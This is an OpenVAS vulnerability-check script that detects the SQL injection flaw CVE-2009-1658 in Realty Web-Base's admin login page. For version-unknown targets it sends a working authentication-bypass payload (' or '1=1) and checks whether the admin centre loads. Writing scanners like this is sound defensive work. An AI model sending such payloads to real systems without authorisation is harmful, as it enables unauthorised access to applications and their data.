###############################################################################
# OpenVAS Vulnerability Test
# $Id: realty_web_base_34886.nasl 15 2013-10-27 12:49:54Z jan $
#
# Realty Web-Base 'admin/admin.php' Multiple SQL Injection
# Vulnerabilities
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Realty Web-Base is prone to multiple SQL-injection vulnerabilities
  because it fails to sufficiently sanitize user-supplied data before
  using it in an SQL query.

  Exploiting these issues can allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.";


if (description)
{
 script_id(100195);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-05-10 17:01:14 +0200 (Sun, 10 May 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-1658");
 script_bugtraq_id(34886);
 script_tag(name:"risk_factor", value:"High");

 script_name("Realty Web-Base 'admin/admin.php' Multiple SQL Injection Vulnerabilities");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if Realty Web-Base is vulnerable to SQL Injection");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("realty_web_base_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34886");
 exit(0);
}

include("http_func.inc");
include("version_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!version = get_kb_item(string("www/", port, "/RealtyWebBase")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

vers = matches[1];
dir  = matches[2];

if(!isnull(vers) && vers >!< "unknown") {

  if(version_is_equal(version: vers, test_version: "1.0")) {
     security_hole(port:port);
     exit(0);
  }   
} else {

  variables = string("user=%27%20or%20%271=1&password=%27%20or%20%271=1");
  filename = string(dir,"/admin/admin.php");
  host=get_host_name();

  req = string(
              "POST ", filename, " HTTP/1.1\r\n",
              "Referer: ","http://", host, filename, "\r\n",
              "Host: ", host, ":", port, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(variables),
              "\r\n\r\n",
              variables
            );

  result = http_send_recv(port:port, data:req, bodyonly:FALSE);
  if( result == NULL )exit(0);

  if(egrep(pattern:"Realty Web-Base: Administration Center", string:result)) {
    security_warning(port);
    exit(0);
  }  

}  

exit(0);
